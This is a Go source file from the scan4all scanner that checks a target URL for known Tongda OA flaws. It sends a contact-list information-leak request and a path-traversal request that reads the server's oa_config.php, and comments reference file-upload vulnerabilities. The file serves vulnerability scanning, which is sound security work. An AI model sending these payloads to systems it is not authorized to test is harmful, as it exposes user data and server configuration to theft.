package tongda

import "github.com/hktalent/scan4all/lib/util"

func CheckOthers(u string) {
	// http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v2014%20get_contactlist.php%20敏感信息泄漏漏洞.html
	if szU01, ok := util.DoCheckGet(u, &[]string{"/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3"}, &[]string{"\"user_id\""}, true); ok {
		util.SendLog(szU01, "oa", "tongda", "")
	}

	// http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v2017%20video_file.php%20任意文件下载漏洞.html
	if szU01, ok := util.DoCheckGet(u, &[]string{"/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"}, &[]string{"$ROOT_PATH", "substr"}, true); ok {
		util.SendLog(szU01, "oa", "tongda", "")
	}

	// http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v2017%20action_upload.php%20任意文件上传漏洞.html
	// http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v11.2%20upload.php%20后台任意文件上传漏洞.html
	//if szU01, ok := util.DoCheckGet(u, &[]string{"/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"}, &[]string{"$ROOT_PATH", "substr"}, true); ok {
	//	util.SendLog(szU01, "oa", "tongda", "")
	//}
}
